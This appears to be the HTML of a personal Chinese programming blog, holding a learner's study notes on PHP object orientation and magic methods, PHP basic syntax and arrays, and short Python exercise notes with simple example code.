+<li><strong>特点</strong><br>–php语言是单继承<br>–子类会继承父类的公共的和受保护的成员属性和方法<br>–子类可以扩展新的属性和方法<br>–子类可以有和父类同名的方法和属性，这时候子类会覆盖父类，叫做重载。这时候要调用原 本的父类方法可以用<code>parent::方法()</code>，而<code>$this-&gt;方法()</code>则是使用子类重载后的方法。<br>–魔术方法也可以被子类继承<br>–如果子类没有构造方法，将继承父类的构造方法，如果有，则覆盖父类的构造方法（重载）<br>可以用<code>parent::__construct()</code>调用父类的构造方法<br>–如果父类中的办法被声明为<code>final</code>,则子类无法覆盖该办法.同样如果一个类被声明为final,则不能被继承.需要注意的是:属性不能被定义为final,只有类和办法才能被定义final.</li>
+</ol>
+<h2 id="访问控制与封装"><a href="#访问控制与封装" class="headerlink" title="访问控制与封装"></a>访问控制与封装</h2><p>在类中创建属性（成员变量）和方法（成员函数）时，需要在前面加上访问控制关键词<br>    *   public   （公有）：公有的类成员可以在任何地方被访问。<br>    *   protected （受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。<br>    *   private  （私有）：私有的类成员则只能被其定义所在的类访问。<br>    *   注意：子类继承父类的方法后重载，访问控制只能和原先相同或者更宽松<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230319220409.png"></p>
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>魔术方法是一种在类中的特殊函数，所以的魔术方法都是以<code>__</code>双下划线开头的<br>主要从 <strong>触发时机</strong>， <strong>作用</strong> ， <strong>参数</strong> ， <strong>返回值</strong> 四个方面来分析一个魔术方法</p>
+<ol>
+<li><strong>构造函数</strong><br><code>__construct()</code><br>-触发时机：在对象进行实例化的时候自动触发<br>-作用：初始化成员属性<br>-参数：无<br>-返回值：无</li>
+<li><strong>析构函数</strong><br><code>__destruct()</code><br>-触发时机：在对象销毁时自动触发（unset() 或 页面执行完毕）<br>-作用：回收对象使用过程中的资源<br>-参数：无<br>-返回值：无</li>
+<li><code>__get($propertyName)</code><br>-触发时机：类的外部访问私有成员,不存在成员的时候自动触发<br>-作用：1.防止报错，2.提供访问私有属性的后门（不能修改）<br>-参数：一个，是访问的私有对象的属性名称<br>-返回值：可以有，可以没有</li>
+<li><code>__set($propertyName,$value)</code><br>-触发时机：类的外部设置私有成员的值时候自动触发<br>-作用：1.防止报错，2.设置私有属性<br>-参数：两个，是访问的私有对象的属性名称，属性的值<br>-返回值：无</li>
+<li><code>__isset($propertyName)</code><br>-触发时机：在类外部对私有成员进行isset检测时自动触发<br>-作用：代替外部isset，在类的内部进行变量检测<br>-参数：一个，是检测的私有成员的属性名称<br>-返回值：返回一个布尔值,是isset的结果</li>
+<li><code>__unset()</code><br>-触发时机：试图对私有成员进行unset删除时自动触发<br>-作用：代替外部unset，在类的内部进行变量删除<br>-参数：一个，是要删除的私有成员的属性名称<br>-返回值：无</li>
+<li><code>__call($funName,$arguments)</code>，<code>__callStatic()静态</code><br>-触发时机：在对象调用一个不可访问,不存在的方法时自动触发<br>-作用：防止调用的方法不存在而导致程序终止<br>-参数：两个，$funName是不存在的函数名，$arguments是以数组的形式接收不存在方法的多个参数<br>-返回值：可以返回任意类型的值</li>
+<li><code>__toString()</code><br>-触发时机：一个类被当成字符串时自动触发（例如echo 一个对象名）<br>-作用：防止报错,返回一个字符串<br>-参数：无<br>-返回值：必须返回一个字符串</li>
+<li><code>__invoke()</code><br>-触发时机：当你试图以函数的方式调用一个对象时,这个方法会被自动调用。<br>-作用：防止报错,可以在这个方法里实现任意操作<br>-参数：可以接受任意数量的参数<br>-返回值：可以返回任意类型的值。</li>
+<li><code>__autoload($ClassName)</code><br>-触发时机：使用一个未定义的类时，自动调用 __autoload() 函数<br>-作用：当通过new来实例化一个类时，通过__autoload自动包含对应的文件<br>-参数：一个参数，即未定义的类名<br>-返回值：无<br>-实例:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class_name</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$class_name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br></pre></td></tr></table></figure></li>
+<li><code>__sleep()</code><br>-触发时机：在类外部调用序列化<code>serialize()</code>时自动调用<br>-作用：如果只想序列化对象中的某些属性，只有返回的数组中有的属性名才会被序列化<br>-参数：无<br>-返回值：返回一个包含对象中需要序列化的属性名的数组。</li>
+<li><code>__wakeup</code><br>-触发时机：在类外部调用反序列化<code>unserialize()</code>时自动调用<br>-作用：重新初始化对象的状态，或者重新建立数据库连接、重新分配资源等。(比如在构造函数中给属性赋值了,但是序列化时只保留属性,可以在反序列化时重新赋值)<br>-参数：无<br>-返回值：无</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/13/PHP%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hearder.jpg">
+      <meta itemprop="name" content="？？喵！！">
+      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="睡猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/13/PHP%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">PHP语言的学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-13 23:13:48" itemprop="dateCreated datePublished" datetime="2023-03-13T23:13:48+08:00">2023-03-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-22 00:48:22" itemprop="dateModified" datetime="2023-03-22T00:48:22+08:00">2023-03-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>12 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>以<code>&lt;?php</code>  作为开头<br>每句话以 <code>;</code>结尾<br><code>?&gt;</code>  作为结尾</p>
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><code>//</code>  <em>单行注释</em><br><code>/**  */</code>   <em>多行注释</em></p>
+<h2 id="传值与传址"><a href="#传值与传址" class="headerlink" title="传值与传址"></a>传值与传址</h2><p><code>$a=$b</code>   <em>传值，指向不同的内存空间</em><br><code>$a=&amp;$b</code>  <em>传址，指向相同的内存空间，同时改变</em></p>
+<h2 id="局部变量，全局变量与超全局变量"><a href="#局部变量，全局变量与超全局变量" class="headerlink" title="局部变量，全局变量与超全局变量"></a>局部变量，全局变量与超全局变量</h2><p>全局声明（函数外声明）的变量会保存在<code>$-GLOBALS</code>中，函数内默认不能访问全局变量，访问需要加上global关键字<br>也可以使用全局数组<code>$GLOBALS(&#39;变量名&#39;)</code>调用全局变量</p>
+<p><em><strong>超全局变量</strong></em><br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230314100903.png"><br><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-superglobals.html">菜鸟教程全局变量</a></p>
+<p>局部变量：函数内部声明的变量，只能在函数内部使用</p>
+<h2 id="变量检测和变量删除"><a href="#变量检测和变量删除" class="headerlink" title="变量检测和变量删除"></a>变量检测和变量删除</h2><p><code>isset()</code>   <em>检测</em><br><code>unset()</code>   <em>删除，在函数中用global引入的全局变量无法删除</em></p>
+<h2 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h2><p>延长生命周期（好像和c语言一样）</p>
+<h2 id="字符串界定符"><a href="#字符串界定符" class="headerlink" title="字符串界定符"></a>字符串界定符</h2><p>作用就是按照原样，包括换行格式什么的，输出在其内部的东西,任何特殊字符都不需要转义</p>
+<blockquote>
+</blockquote>
+<pre><code>$str =&lt;&lt;&lt;EOF
+EOF;
+</code></pre>
+<h2 id="strlen-和mb-strlen"><a href="#strlen-和mb-strlen" class="headerlink" title="strlen()和mb_strlen()"></a>strlen()和mb_strlen()</h2><p><code>strlen()</code>   <em>用于计算字符串长度</em><br><code>mb_strlen(变量名,&#39;编码形式（utf8）&#39;)</code>   <em>宽字节计算长度</em></p>
+<h2 id="PHP类型比较"><a href="#PHP类型比较" class="headerlink" title="PHP类型比较"></a>PHP类型比较</h2><p>php是弱类型语音，经常要对变量进行比较；<br><strong>松散比较</strong>：使用两个<code>==</code>，只比较值<br><strong>严格比较</strong>：使用三个<code>===</code>，既比较值，也比较类型</p>
+<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量被定义后，在脚本其他任何地方不能被改变，常量是全局的，函数内也可以<strong>直接使用</strong></p>
+<ol>
+<li>使用<strong>define(“名称”,”常量的值”,是否区分大小写)</strong><br>例如 <code>define(&quot;GREE&quot;,&quot;欢迎欢迎&quot;,ture)</code>&#x2F;&#x2F;<em>常量名前面不能加$</em></li>
+<li>使用<strong>const 名称&#x3D;常量的值</strong><br>例如 <code>const NAME=&#39;哈哈哈</code>   &#x2F;&#x2F;<em>常量一般情况下用大写字母</em></li>
+</ol>
+<h2 id="并置运算符"><a href="#并置运算符" class="headerlink" title="并置运算符"></a>并置运算符</h2><p>使两个字符串相加<br>例如 <code>&quot;hello&quot;.&quot;world&quot;</code></p>
+<h2 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h2><p>用于在字符串内找一个指定的字符或文本，如果找到匹配则返回第一个匹配（<strong>第一个字符要从0开始算</strong>）的字符位置，否则返回FALSE<br>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$txt</span>=<span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$txt</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输出 6 </p>
+<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><table>
+<thead>
+<tr>
+<th>与</th>
+<th>或</th>
+<th>异或</th>
+<th>非</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>and   &amp;&amp;</td>
+<td>or   ||</td>
+<td>xor</td>
+<td>!</td>
+</tr>
+</tbody></table>
+<p>异或：有且仅有一个为true，则返回true<br>非：如果为假则返回真</p>
+<h2 id="组合比较符（太空船）"><a href="#组合比较符（太空船）" class="headerlink" title="组合比较符（太空船）"></a>组合比较符（太空船）</h2><p><code>$c = $a &lt;=&gt; $b;</code></p>
+<blockquote>
+</blockquote>
+<pre><code>如果 $a &gt; $b, 则 $c 的值为 1。
+如果 $a == $b, 则 $c 的值为 0。
+如果 $a &lt; $b, 则 $c 的值为 -1。
+</code></pre>
+<p>c语言的strcmp()函数</p>
+<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p><strong>数组创建</strong></p>
+<ol>
+<li><code>$arr=array();</code></li>
+<li><code>$arr=[];</code></li>
+</ol>
+<p><strong>多维数组</strong></p>
+<ol>
+<li>多维数组创建<br>$arr&#x3D;[<br>[];<br>];</li>
+<li>多维数组的调用<br>$arr[0][1]   &#x2F;&#x2F;<em>可以索引数组和关联数组相结合</em></li>
+</ol>
+<p><strong>关联数组</strong><br>分配给数组指定的键值对,以下两种创建方式是相同的<br><code>$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;Peter&#x27;</span>]=<span class="string">&quot;35&quot;</span>;</span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;Ben&#x27;</span>]=<span class="string">&quot;37&quot;</span>;</span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;Joe&#x27;</span>]=<span class="string">&quot;43&quot;</span>; </span><br></pre></td></tr></table></figure>
+
+<p><strong>与数组有关的函数（方法）</strong></p>
+<ol>
+<li><code>key($arr);</code><br>返回数组的键值（下标）</li>
+<li><code>current($arr)</code><br>返回数组的值</li>
+<li><code>next($arr)</code><br>使数组指针下移，返回下移后的数组的值，最后返回FALSE</li>
+<li><code>prev($arr)</code><br>使数组指针上移，返回下移后的数组的值，最后返回FALSE</li>
+<li><code>count($arr)</code><br>计算数组长度(元素数量)</li>
+<li><code>list($a,$b)=&amp;arr</code><br>将数组第一个值付给$a，第二个值付给$b,以此类推，加上循环可以遍历数组</li>
+</ol>
+<h2 id="数组排列"><a href="#数组排列" class="headerlink" title="数组排列"></a>数组排列</h2><blockquote>
+</blockquote>
+<pre><code>sort() - 对数组进行  升序  排列
+rsort() - 对数组进行  降序  排列
+asort() - 根据关联数组的  值，  对数组进行  升序  排列
+ksort() - 根据关联数组的  键，对数组进行  升序  排列
+arsort() - 根据关联数组的  值，对数组进行  降序  排列
+krsort() - 根据关联数组的  键，对数组进行  降序  排列
+r是降序，k是键，a是值
+</code></pre>
+<p>运行实例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">rsort</span>(<span class="variable">$cars</span>);   <span class="comment">//逆序排列字母元素</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$cars</span>)</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>结果 <code>Array( [0] =&gt; BMW [1] =&gt; Toyota [2] =&gt; Volvo )</code>   <em>自动标出键值对</em></p>
+<h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p>php语言的for循环，while循环和c语言中的循环没有区别，这里不过多介绍<br>主要介绍运行foreach循环<br>foreach用于<strong>遍历数组</strong>，有以下两种形式</p>
+<blockquote>
+</blockquote>
+<pre><code>foreach($array as $value)
+&#123;
+    要执行代码;   //每进行一次循环，当前数组元素的值就会被赋值给 $value 
+&#125;
+</code></pre>
+<blockquote>
+</blockquote>
+<pre><code>foreach($array as $key=&gt; &amp;value)
+&#123;
+    要执行代码;   //每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量
+&#125;
+</code></pre>
+<p>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">array</span>(<span class="string">&quot;aa&quot;</span>=&gt; <span class="number">1</span>,<span class="string">&quot;bb&quot;</span>=&gt; <span class="number">2</span>,<span class="string">&quot;cc&quot;</span>=&gt; <span class="number">3</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>. <span class="string">&quot;=&gt;&quot;</span> .<span class="variable">$value</span>. PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>结果</p>
+<blockquote>
+</blockquote>
+<pre><code>aa=&gt;1
+bb=&gt;2
+cc=&gt;3
+</code></pre>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ol>
+<li>php函数用<code>function</code>关键字</li>
+<li>函数可以传参，可以传址，如果参数个数不确定的情况下可以用<strong>点语法</strong><br>例如  <code>function sum(...$var)&#123;&#125;</code>  &#x2F;&#x2F;<em>注意$var是个数组</em></li>
+<li>参数可以设定<strong>默认值</strong><br>例如  <code>function sum($var=100)&#123;&#125;</code> &#x2F;&#x2F;<em>没有传递参数时使用默认值</em></li>
+<li>参数可以<strong>强制类型</strong><br>例如  <code>function sum(int $var)&#123;&#125;</code><br>&#x2F;&#x2F;<em>在函数前面加上declare(strict_types&#x3D;1);变成严格模式，字符与整形也不能互传</em></li>
+<li>函数<strong>返回值约束</strong><br>例如  <code>function sum(int $var): string</code><br>&#x2F;&#x2F;<em>返回类型前加上问号，代表返回值可有可无</em></li>
+<li>函数的特殊用法：<strong>变量函数</strong><br>函数在调用时的函数名可以是一个变量<br>例如:<blockquote>
+</blockquote>
+<pre><code>&amp;name=&quot;fun&quot;;
+function fun()&#123;&#125;;
+$name();
+</code></pre>
+</li>
+</ol>
+<p>根据函数名的变化调用不同的函数</p>
+<h2 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h2><p>PHP 向它运行的任何脚本提供了大量的预定义常量。<br><strong>定义</strong>：有八个魔术常量的值是随着在代码中的位置而改变</p>
+<blockquote>
+</blockquote>
+<pre><code>__LIEN__
+__FILE__
+__DIR__
+__FUNCTION__
+__CLASS__
+__TRAIL__
+__METHOD__
+__NAMESPACE__
+</code></pre>
+<ol>
+<li><p>__LINE__<br>文件中LINE所在的行号</p>
+</li>
+<li><p>__FILE__<br>文件完整的路径和文件名</p>
+</li>
+<li><p>__DIR__<br>文件所在的目录（也就是FILE减去文件名&#x3D;&#x3D;<code>dirname(__FILE__)</code>）</p>
+</li>
+<li><p>__FUNCTION__<br>函数名称（当然得写在函数里）</p>
+</li>
+<li><p>__CLASS__<br>类的名称，php5起返回类被定义时候的名称（区分大小写）</p>
+</li>
+<li><p>__TRAIT__<br>trait的名字</p>
+</li>
+<li><p>__METHOD__<br>类的方法名，返回该方法被定义时的名称</p>
+</li>
+<li><p>__NAMESPACE__<br>当前命名空间的名称</p>
+</li>
+</ol>
+<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>语法:<br><code>namespace 空间名;</code><br>每一个命名空间类似于一个文件夹，函数类似于文件，同一个文件夹不能有相同命名的文件，所以需要使用命名空间，使用命名空间的函数时，用<code>NAMESPACE\函数名</code>的格式调用</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/13/python%E7%BB%83%E4%B9%A0%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hearder.jpg">
+      <meta itemprop="name" content="？？喵！！">
+      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="睡猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/13/python%E7%BB%83%E4%B9%A0%E9%A2%98/" class="post-title-link" itemprop="url">python练习题</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-13 20:49:42" itemprop="dateCreated datePublished" datetime="2023-03-13T20:49:42+08:00">2023-03-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-17 16:21:26" itemprop="dateModified" datetime="2023-03-17T16:21:26+08:00">2023-03-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index"><span itemprop="name">Python</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>882</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="斐波那契函数"><a href="#斐波那契函数" class="headerlink" title="斐波那契函数"></a>斐波那契函数</h2><p>在——上补充代码，输出100以内的斐波那契数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a,b=<span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a&lt;=<span class="number">100</span>:</span><br><span class="line">    <span class="built_in">print</span>(a,end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    ------</span><br></pre></td></tr></table></figure>
+<p>答案：<br><code>a,b=b+a,a</code></p>
+<p>试着思考相同结构能否用c语言实现</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">0</span>,b=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(a&lt;=<span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,a);</span><br><span class="line">        ------</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>想了许久没有想出答案，在python的赋值中<code>a,b=b+a,a</code>,a和b的赋值是同时进行的，但是在c语言中似乎无法用同时赋值，必须引用一个新的变量</p>
+<h2 id="jieba库"><a href="#jieba库" class="headerlink" title="jieba库"></a>jieba库</h2><p>常用函数jieba.lcut(s)   精确模式，返回一个列表类型。作用：分词,按中文逻辑切片</p>
+<h2 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h2><p>把字符串形式的结果保留原本的东西，在进行正常的运算</p>
+<h2 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h2><p>ord()参数是一个字符，不能是字符串，返回该字符对应的Unicode码<br>chr()的作用是：输入一个十进制或十六进制数字，返回其在Unicode编码中对应的文字或符号</p>
+<h2 id="format格式化输出"><a href="#format格式化输出" class="headerlink" title="format格式化输出"></a>format格式化输出</h2><p>语法<code>print(&quot;&#123;参数&#125;&quot;.format(内容))</code><br>参数格式：冒填齐宽逗点类<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230313213146.png"></p>
+<h2 id="列表切片：列表名-索引值-索引值-步长"><a href="#列表切片：列表名-索引值-索引值-步长" class="headerlink" title="列表切片：列表名[索引值:索引值:步长]"></a>列表切片：列表名[索引值:索引值:步长]</h2><p>索引值省略默认为起始值或终止值</p>
+<h2 id="random库（随机）"><a href="#random库（随机）" class="headerlink" title="random库（随机）"></a>random库（随机）</h2><p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230313215009.png"></p>
+<h2 id="len-函数"><a href="#len-函数" class="headerlink" title="len()函数"></a>len()函数</h2><p>计算字符长度<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230317151959.png"></p>
+<h2 id="str-split-方法"><a href="#str-split-方法" class="headerlink" title="str.split()方法"></a>str.split()方法</h2><p>split(‘分割符’,num)   用指定分隔符对字符串切片，分割成num+1个字符串（切num刀）。<br>返回值是num+1个列表<br>可以省略，默认以空格全切</p>
+<h2 id="pow-函数"><a href="#pow-函数" class="headerlink" title="pow()函数"></a>pow()函数</h2><p>pow(x,y,z)   x底数，y指数，z取余字数<br>只有xy的情况下返回值是x的y次方<br>有z的情况下返回值是pow(x,y)的结果对z求余</p>
+<h2 id="print"><a href="#print" class="headerlink" title="print()"></a>print()</h2><p>print输出后自动换行<br>可以用print(,end&#x3D;’结尾符’)改变结尾</p>
+<h2 id="complex-函数"><a href="#complex-函数" class="headerlink" title="complex()函数"></a>complex()函数</h2><p>complex是python中的复数类型，以类似5+6j的形式表达<br>complex函数用于创建一个复数或者将一个字符串转化为复数形式</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/11/%E8%AF%95%E4%B8%80%E4%B8%8B%E5%9B%BE%E7%89%87%E7%9A%84%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hearder.jpg">
+      <meta itemprop="name" content="？？喵！！">
+      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="睡猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/11/%E8%AF%95%E4%B8%80%E4%B8%8B%E5%9B%BE%E7%89%87%E7%9A%84%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">试一下图片的上传</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-11 19:09:41" itemprop="dateCreated datePublished" datetime="2023-03-11T19:09:41+08:00">2023-03-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-13 23:50:44" itemprop="dateModified" datetime="2023-03-13T23:50:44+08:00">2023-03-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Others/" itemprop="url" rel="index"><span itemprop="name">Others</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>70</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
